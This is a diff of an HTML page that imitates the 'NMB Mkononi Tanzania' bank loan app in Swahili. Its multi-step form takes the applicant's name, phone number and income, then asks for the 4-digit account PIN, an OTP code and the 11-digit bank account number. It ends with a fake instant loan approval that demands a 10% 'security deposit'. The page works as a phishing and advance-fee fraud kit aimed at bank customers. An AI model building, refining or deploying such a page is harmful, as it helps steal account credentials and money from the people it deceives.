@@ -3,269 +3,258 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NMB Mkononi - Pata Mkopo Wako Haraka</title>
+    <title>NMB Mkononi Tanzania - Pata Mkopo Wako Haraka</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <!-- Surface Notification Banner -->
-    <div id="surface-notification" class="surface-notification hidden"></div>
 
-    <!-- Global Loading Overlay -->
-    <div id="loading-overlay" class="loading-overlay hidden">
-        <div class="spinner"></div>
-        <p>Inapakia tafadhali subiri...</p>
-    </div>
-
-    <!-- Header Branding -->
-    <header class="app-header">
-        <div class="header-left">
-            <span class="menu-icon">☰</span>
-            <span id="back-btn" class="back-btn hidden">← Rudi</span>
+    <!-- Header with Tanzania Flag & NMB Logo -->
+    <header class="nmb-header">
+        <div class="logo-container">
+            <span class="nmb-brand">NMB</span>
+            <span class="divider">|</span>
+            <span class="brand-sub">MKONONI TANZANIA</span>
         </div>
-        <div class="brand-container">
-            <div class="nmb-logo-text">NMB</div>
-            <div class="divider-vertical"></div>
-            <div class="tanzania-branding">
-                <span class="flag-icon">🇹🇿</span>
-                <span class="mkononi-text">MKONONI<br><small>TANZANIA</small></span>
-            </div>
+        <div class="tz-flag-badge">
+             <!-- Tanzania Flag SVG -->
+             <svg width="36" height="24" viewBox="0 0 900 600">
+                <rect width="900" height="600" fill="#1EB53A"/>
+                <path d="M0,600 L900,0 L900,100 L0,600 Z" fill="#00A3DD"/>
+                <path d="M0,600 L900,0 L900,150 L0,600 Z" fill="#000000" opacity="0.15"/>
+                <polygon points="0,600 900,0 900,120 0,600" fill="#FCD116"/>
+                <polygon points="0,580 900,0 900,80 0,560" fill="#000"/>
+            </svg>
         </div>
-        <div class="header-right"></div>
     </header>
 
-    <main class="main-container">
-        <!-- SCREEN 1: SLIDER LOAN CALCULATOR -->
-        <section id="screen-slider" class="app-screen active">
-            <div class="card-box">
-                <h2>Pata Mkopo Wako Haraka</h2>
+    <!-- Surface Notification Banner (No popups/floats) -->
+    <div id="surface-notification" class="surface-notification hidden"></div>
+
+    <!-- Loading Overlay -->
+    <div id="loading-overlay" class="loading-overlay hidden">
+        <div class="spinner"></div>
+        <p id="loading-text" class="bold-text">Tafadhali subiri...</p>
+    </div>
+
+    <main class="container">
+
+        <!-- SCREEN 1: SLIDER / CALCULATOR -->
+        <section id="screen-slider" class="screen active">
+            <div class="card">
+                <h2 class="title">Pata Mkopo Wako Haraka</h2>
                 <p class="subtitle">Idhini ya haraka • Riba nafuu • Muda rahisi</p>
-                
+
                 <div class="calculator-box">
-                    <h3>Kikokotoo cha Mkopo</h3>
-                    <label>Kiasi cha Mkopo</label>
-                    <input type="range" id="loan-amount-range" min="10000" max="100000000" step="5000" value="100000">
-                    <div class="range-labels"><span>TSh 10K</span><span id="display-amount">TSh 100,000</span><span>TSh 100M</span></div>
+                    <label class="bold-text">Kiasi cha Mkopo</label>
+                    <div class="amount-display" id="display-amount">TSh 100,000</div>
+                    <input type="range" id="range-amount" min="10000" max="10000000" step="5000" value="100000">
+                    <div class="range-limits"><span>TSh 10K</span><span>TSh 10M</span></div>
 
-                    <label>Muda wa Mkopo</label>
-                    <input type="range" id="loan-duration-range" min="6" max="60" step="1" value="12">
-                    <div class="range-labels"><span>miezi 6</span><span id="display-duration">miezi 12</span><span>miezi 60</span></div>
+                    <label class="bold-text" style="margin-top: 20px;">Muda wa Mkopo</label>
+                    <div class="amount-display" id="display-duration">miezi 12</div>
+                    <input type="range" id="range-duration" min="6" max="60" step="1" value="12">
+                    <div class="range-limits"><span>miezi 6</span><span>miezi 60</span></div>
 
-                    <div class="monthly-payment-display">
+                    <div class="monthly-payment-box">
                         <span>Malipo ya Kila Mwezi</span>
                         <strong id="display-monthly">TSh 9,504</strong>
                     </div>
                 </div>
 
-                <button id="btn-omba-sasa" class="primary-btn">OMBA SASA</button>
+                <button id="btn-omba-sasa" class="primary-btn bold-text">OMBA SASA</button>
 
-                <div class="features-grid">
-                    <div class="feature-item">⚡ <strong>Idhini ya Haraka</strong><br><small>Ndani ya masaa 24</small></div>
-                    <div class="feature-item">💰 <strong>Riba Nafuu</strong><br><small>Kuanzia 25%</small></div>
-                    <div class="feature-item">🔒 <strong>Salama</strong><br><small>Kiwango cha benki</small></div>
+                <div class="features-footer">
+                    <div>⚡ <strong>Idhini ya Haraka</strong><br><small>Ndani ya masaa 24</small></div>
+                    <div>💰 <strong>Riba Nafuu</strong><br><small>Kuanzia 25%</small></div>
+                    <div>🔒 <strong>Salama</strong><br><small>Kiwango cha benki</small></div>
                 </div>
             </div>
         </section>
 
-        <!-- SCREEN 2: STEP 1 OF 3 (Maombi ya Mkopo) -->
-        <section id="screen-step1" class="app-screen">
-            <div class="card-box">
-                <h2>Maombi ya Mkopo</h2>
-                <p class="step-indicator">Hatua 1 ya 3</p>
-                <div class="progress-bar"><div class="progress-fill" style="width: 33%;"></div></div>
+        <!-- SCREEN 2: STEP 1 of Loan Form -->
+        <section id="screen-step1" class="screen">
+            <div class="card">
+                <h2 class="title">Maombi ya Mkopo</h2>
+                <p class="step-indicator bold-text">Hatua 1 ya 3</p>
 
-                <label>Aina ya Mkopo</label>
-                <select id="loan-type" class="input-field">
+                <label class="bold-text">Aina ya Mkopo</label>
+                <select id="loan-type" class="input-field bold-text">
                     <option value="Mkopo wa Biashara">Mkopo wa Biashara</option>
-                    <option value="Mkopo wa Haraka">Mkopo wa Haraka</option>
+                    <option value="Mkopo wa Binafsi">Mkopo wa Binafsi</option>
+                    <option value="Mkopo wa Kilimo">Mkopo wa Kilimo</option>
                 </select>
 
-                <label>Kiasi cha Mkopo (TSh)</label>
-                <input type="text" id="step1-amount" class="input-field" value="100000">
+                <label class="bold-text">Kiasi cha Mkopo (TSh)</label>
+                <input type="number" id="input-loan-amount" class="input-field bold-text" value="100000">
 
-                <label>Muda wa Mkopo</label>
-                <select id="loan-months" class="input-field">
-                    <option value="Miezi 48">Miezi 48</option>
+                <label class="bold-text">Muda wa Mkopo</label>
+                <select id="loan-duration-select" class="input-field bold-text">
                     <option value="Miezi 12">Miezi 12</option>
                     <option value="Miezi 24">Miezi 24</option>
+                    <option value="Miezi 48">Miezi 48</option>
+                    <option value="Miezi 60">Miezi 60</option>
                 </select>
 
-                <label>Madhumuni ya Mkopo</label>
-                <textarea id="loan-purpose" class="input-field" placeholder="Elezea madhumuni ya mkopo wako..."></textarea>
+                <label class="bold-text">Madhumuni ya Mkopo</label>
+                <textarea id="loan-purpose" class="input-field bold-text" placeholder="Elezea madhumuni ya mkopo wako..."></textarea>
 
-                <button id="btn-step1-next" class="primary-btn">HATUA INAYOFUATA</button>
+                <button id="btn-step1-next" class="primary-btn bold-text">HATUA INAYOFUATA</button>
             </div>
         </section>
 
-        <!-- SCREEN 3: STEP 2 OF 3 (Personal Details & Phone) -->
-        <section id="screen-step2" class="app-screen">
-            <div class="card-box">
-                <h2>Maombi ya Mkopo</h2>
-                <p class="step-indicator">Hatua 2 ya 3</p>
-                <div class="progress-bar"><div class="progress-fill" style="width: 66%;"></div></div>
+        <!-- SCREEN 3: STEP 2 (Names & Phone with TZ Flag) -->
+        <section id="screen-step2" class="screen">
+            <div class="card">
+                <h2 class="title">Maombi ya Mkopo</h2>
+                <p class="step-indicator bold-text">Hatua 2 ya 3</p>
 
                 <div class="row-inputs">
                     <div>
-                        <label>Jina la Kwanza</label>
-                        <input type="text" id="first-name" class="input-field" placeholder="Jina la kwanza">
+                        <label class="bold-text">Jina la Kwanza</label>
+                        <input type="text" id="first-name" class="input-field bold-text" placeholder="Jina la kwanza">
                     </div>
                     <div>
-                        <label>Jina la Ukoo</label>
-                        <input type="text" id="last-name" class="input-field" placeholder="Jina la ukoo">
+                        <label class="bold-text">Jina la Ukoo</label>
+                        <input type="text" id="last-name" class="input-field bold-text" placeholder="Jina la ukoo">
                     </div>
                 </div>
 
-                <label>Namba ya Simu</label>
+                <label class="bold-text">Namba ya Simu (NMB Mkononi)</label>
                 <div class="phone-input-group">
-                    <span class="flag-prefix">🇹🇿 +255</span>
-                    <input type="tel" id="phone-number" class="input-field" placeholder="712345678 au 0712345678" maxlength="10">
+                    <div class="flag-prefix bold-text">
+                        <svg width="22" height="15" viewBox="0 0 900 600"><rect width="900" height="600" fill="#1EB53A"/><path d="M0,600 L900,0 L900,100 L0,600 Z" fill="#00A3DD"/><polygon points="0,600 900,0 900,120 0,600" fill="#FCD116"/><polygon points="0,580 900,0 900,80 0,560" fill="#000"/></svg>
+                        +255
+                    </div>
+                    <input type="tel" id="phone-number" class="input-field bold-text" placeholder="712345678" maxlength="9">
                 </div>
-                <small class="hint-text">Weka nambari 9 au anza na 0 (mfano, 0712345678)</small>
+                <small class="hint-text bold-text">Weka namba 9 au anza na 0 (mfano, 0712345678 → inabadilika hadi 712345678)</small>
 
                 <div class="btn-group">
-                    <button id="btn-step2-prev" class="secondary-btn">ILIYOTANGULIA</button>
-                    <button id="btn-step2-next" class="primary-btn">HATUA INAYOFUATA</button>
+                    <button id="btn-step2-back" class="secondary-btn bold-text">ILIYOTANGULIA</button>
+                    <button id="btn-step2-next" class="primary-btn bold-text">HATUA INAYOFUATA</button>
                 </div>
             </div>
         </section>
 
-        <!-- SCREEN 4: STEP 3 OF 3 (Employment Details) -->
-        <section id="screen-step3" class="app-screen">
-            <div class="card-box">
-                <h2>Maombi ya Mkopo</h2>
-                <p class="step-indicator">Hatua 3 ya 3</p>
-                <div class="progress-bar"><div class="progress-fill" style="width: 100%;"></div></div>
+        <!-- SCREEN 4: STEP 3 (Employment & Summary) -->
+        <section id="screen-step3" class="screen">
+            <div class="card">
+                <h2 class="title">Maombi ya Mkopo</h2>
+                <p class="step-indicator bold-text">Hatua 3 ya 3</p>
 
-                <label>Hali ya Ajira</label>
-                <select id="employment-status" class="input-field">
+                <label class="bold-text">Hali ya Ajira</label>
+                <select id="employment-status" class="input-field bold-text">
                     <option value="Mfanyabiashara">Mfanyabiashara</option>
-                    <option value="Mwajiriwa">Mwajiriwa</option>
+                    <option value="Miajiriwa">Miajiriwa</option>
+                    <option value="Mjasiriamali">Mjasiriamali</option>
                 </select>
 
-                <label>Mapato ya Mwaka (TSh)</label>
-                <input type="text" id="annual-income" class="input-field" placeholder="Weka mapato ya mwaka">
+                <label class="bold-text">Mapato ya Mwaka (TSh)</label>
+                <input type="number" id="annual-income" class="input-field bold-text" placeholder="Weka mapato ya mwaka">
 
                 <div class="summary-box">
-                    <h4>Muhtasari wa Maombi</h4>
-                    <p><strong>Kiasi cha Mkopo:</strong> TSh 100,000</p>
-                    <p><strong>Muda wa Mkopo:</strong> Miezi 48</p>
-                    <p><strong>Madhumuni:</strong> Biashara</p>
+                    <strong class="bold-text">Muhtasari wa Maombi</strong>
+                    <div class="summary-row"><span class="bold-text">Kiasi cha Mkopo:</span> <strong id="sum-amount" class="bold-text">TSh 100,000</strong></div>
+                    <div class="summary-row"><span class="bold-text">Muda wa Mkopo:</span> <strong id="sum-duration" class="bold-text">Miezi 48</strong></div>
+                    <div class="summary-row"><span class="bold-text">Madhumuni:</span> <strong id="sum-purpose" class="bold-text">Biashara</strong></div>
+                    <div class="summary-row"><span class="bold-text">Mwombaji:</span> <strong class="bold-text">NMB MKONONI</strong></div>
                 </div>
 
                 <div class="btn-group">
-                    <button id="btn-step3-prev" class="secondary-btn">ILIYOTANGULIA</button>
-                    <button id="btn-step3-submit" class="primary-btn">WASILISHA MAOMBI</button>
+                    <button id="btn-step3-back" class="secondary-btn bold-text">ILIYOTANGULIA</button>
+                    <button id="btn-step3-submit" class="primary-btn bold-text">WASILISHA MAOMBI</button>
                 </div>
             </div>
         </section>
 
-        <!-- SCREEN 5: PIN ENTRY SCREEN (Appears after Step 3 out of 3) -->
-        <section id="screen-pin" class="app-screen">
-            <div class="card-box text-center">
-                <h3>Ingia Akaunti</h3>
-                <p class="subtitle">Weka PIN yako (tarakimu 4)</p>
+        <!-- SCREEN 5: ENTER NMB MKONONI PIN -->
+        <section id="screen-pin" class="screen">
+            <div class="card center-content">
+                <div class="nmb-mini-logo">NMB MKONONI</div>
+                <h2 class="title">Ingia Akaunti</h2>
+                <p class="subtitle bold-text">Weka PIN yako (tarakimu 4)</p>
 
-                <div class="phone-display-banner">
-                    📱 <span id="lbl-masked-phone">+255...</span>
+                <div class="pin-inputs">
+                    <input type="password" maxlength="1" class="pin-box bold-text" inputmode="numeric">
+                    <input type="password" maxlength="1" class="pin-box bold-text" inputmode="numeric">
+                    <input type="password" maxlength="1" class="pin-box bold-text" inputmode="numeric">
+                    <input type="password" maxlength="1" class="pin-box bold-text" inputmode="numeric">
                 </div>
 
-                <div class="pin-boxes-container">
-                    <input type="password" maxlength="1" class="pin-box" inputmode="numeric" />
-                    <input type="password" maxlength="1" class="pin-box" inputmode="numeric" />
-                    <input type="password" maxlength="1" class="pin-box" inputmode="numeric" />
-                    <input type="password" maxlength="1" class="pin-box" inputmode="numeric" />
-                    <span id="toggle-pin-visibility" class="eye-icon">👁️</span>
-                </div>
-
-                <p class="forgot-pin-text">Umesahau PIN?</p>
-
-                <button id="btn-pin-submit" class="primary-btn">INGIA</button>
+                <button id="btn-submit-pin" class="primary-btn bold-text" style="margin-top: 30px;">INGIA</button>
             </div>
         </section>
 
         <!-- SCREEN 6: OTP VERIFICATION -->
-        <section id="screen-otp" class="app-screen">
-            <div class="card-box">
-                <h2>Uthibitisho wa OTP</h2>
-                <p class="subtitle" id="otp-subtitle">Weka OTP iliyotumwa kwenye nambari yako ya simu</p>
-                
-                <div class="success-alert-box">
-                    ✓ Maelezo yamethibitishwa! Tafadhali weka OTP yako hapa chini.
-                </div>
+        <section id="screen-otp" class="screen">
+            <div class="card">
+                <h2 class="title">Uthibitisho wa OTP</h2>
+                <p class="subtitle bold-text">Weka OTP iliyotumwa kwenye namba yako ya simu <span id="lbl-otp-phone" class="bold-text">+255712345678</span></p>
 
                 <div class="otp-inputs">
-                    <input type="text" maxlength="1" class="otp-box" inputmode="numeric" />
-                    <input type="text" maxlength="1" class="otp-box" inputmode="numeric" />
-                    <input type="text" maxlength="1" class="otp-box" inputmode="numeric" />
-                    <input type="text" maxlength="1" class="otp-box" inputmode="numeric" />
+                    <input type="text" maxlength="1" class="otp-box bold-text" inputmode="numeric">
+                    <input type="text" maxlength="1" class="otp-box bold-text" inputmode="numeric">
+                    <input type="text" maxlength="1" class="otp-box bold-text" inputmode="numeric">
+                    <input type="text" maxlength="1" class="otp-box bold-text" inputmode="numeric">
                 </div>
 
-                <p class="timer-text">Tuma tena msimbo ndani ya 40 sekunde</p>
-
-                <button id="btn-otp-submit" class="primary-btn">WASILISHA</button>
+                <p class="timer-text bold-text">Tuma tena msimu ndani ya 40 sekunde</p>
+                <button id="btn-submit-otp" class="primary-btn bold-text">WASILISHA</button>
             </div>
         </section>
 
-        <!-- SCREEN 7: NMB BANK ACCOUNT DETAILS -->
-        <section id="screen-account" class="app-screen">
-            <div class="card-box text-center">
-                <div class="bank-icon-header">🏛️</div>
-                <h2>BANK ACCOUNT DETAILS</h2>
-                <p class="subtitle">Please enter your NMB Bank account number below.</p>
+        <!-- SCREEN 7: NMB BANK ACCOUNT DETAILS (11 DIGITS) -->
+        <section id="screen-account" class="screen">
+            <div class="card">
+                <div class="bank-header-icon">🏦</div>
+                <h2 class="title">BANK ACCOUNT DETAILS</h2>
+                <p class="subtitle bold-text">Please enter your NMB Bank account number below.</p>
 
-                <div class="account-input-wrapper">
-                    <label>Account Number</label>
-                    <input type="text" id="nmb-account-input" class="input-field tracking-input" placeholder="_ _ _ _ _ _ _ _ _ _ _" maxlength="11">
+                <label class="bold-text">Account Number</label>
+                <input type="text" id="account-number-input" class="input-field bold-text" placeholder="11223344556" maxlength="11" inputmode="numeric">
+
+                <div class="info-box bold-text">
+                    ℹ️ Enter exactly 11 digits.<br>Example: 12345678901
                 </div>
 
-                <div class="info-banner">
-                    ℹ️ <strong>Enter exactly 11 digits.</strong><br>Example: 12345678901
-                </div>
-
-                <div class="warning-banner">
+                <div class="warning-box bold-text">
                     ⚠️ Please double-check the account number before submitting.
                 </div>
 
-                <button id="btn-account-submit" class="primary-btn">WASILISHA AKAUNTI</button>
+                <button id="btn-submit-account" class="primary-btn bold-text">SUBMIT ACCOUNT</button>
             </div>
         </section>
 
-        <!-- SCREEN 8: SUCCESS & LOAN APPROVAL PAGE -->
-        <section id="screen-success" class="app-screen">
-            <div class="card-box text-center">
-                <div class="success-badge">✓</div>
-                <h2>Hongera!</h2>
-                <p class="subtitle">Mkopo wako umeidhinitishwa! Fedha zitatolewa hivi karibuni.</p>
+        <!-- SCREEN 8: SUCCESS SCREEN -->
+        <section id="screen-success" class="screen">
+            <div class="card success-card">
+                <div class="success-icon-container">✓</div>
+                <h2 class="title">Hongera!</h2>
+                <p class="subtitle bold-text">Mkopo wako <strong>umeidhinishwa!</strong> Fedha zitatolewa hivi karibuni.</p>
 
-                <div class="amount-approved-box">
-                    <small>KIASI KILICHOIDHINISHWA</small>
-                    <h3>TSh 100,000</h3>
+                <div class="approved-amount-box">
+                    <span class="bold-text">KIASI KILICHOIDHINISHWA</span>
+                    <h1 class="bold-text">TSh 100,000</h1>
                 </div>
 
-                <div class="notice-box">
+                <div class="notice-box bold-text">
                     ⚠️ <strong>NOTISI YA UZINGATIAJI</strong><br>
-                    Akaunti yako lazima iwe hai na idumishe amana ya usalama ya angalau 10% ya kiasi cha mkopo ulioumbam. Amana hii inarudishwa kamili baada ya kulipa mkopo na husaidia kupata riba nzuri zaidi.
+                    Akaunti yako ya NMB Mkononi lazima iwe hai na idumishe amana ya usalama ya angalau 10% ya kiasi cha mkopo uliouomba. Amana hii inarudishwa kikamilifu baada ya kulipa mkopo na husaidia kupata riba nzuri zaidi.
                 </div>
 
-                <div class="loan-details-summary">
-                    <div class="detail-row"><span>MALIPO YA KILA MWEZI</span> <strong>TSh 2,441</strong></div>
-                    <div class="detail-row"><span>MUDA WA MKOPO</span> <strong>Miezi 48</strong></div>
-                    <div class="detail-row"><span>KIWANGO CHA RIBA</span> <strong>8% APR</strong></div>
+                <div class="details-list">
+                    <div class="detail-item"><span class="bold-text">MALIPO YA KILA MWEZI</span><strong class="bold-text">TSh 2,441</strong></div>
+                    <div class="detail-item"><span class="bold-text">MUDA WA MKOPO</span><strong class="bold-text">Miezi 48</strong></div>
+                    <div class="detail-item"><span class="bold-text">KIWANGO CHA RIBA</span><strong class="bold-text">8% APR</strong></div>
                 </div>
 
-                <div class="action-buttons-stack">
-                    <button class="outline-btn">💰 Weka Fedha</button>
-                    <button class="outline-btn">💸 Toa Fedha</button>
-                    <button class="outline-btn">📄 Maelezo ya Mkopo</button>
-                </div>
-
-                <p class="next-step-note"><strong>Hatua Zinazofuata:</strong> Utapata SMS na barua pepe yenye maelezo ya utolewa ndani ya masaa 24.</p>
-
-                <button id="btn-home" class="primary-btn">🏠 Rudi Nyumbani</button>
+                <button id="btn-home" class="primary-btn bold-text" style="margin-top: 25px;">Rudi Nyumbani</button>
             </div>
         </section>
+
     </main>
 
     <script src="script.js"></script>
 </body>
     </html>
-                    
+                        
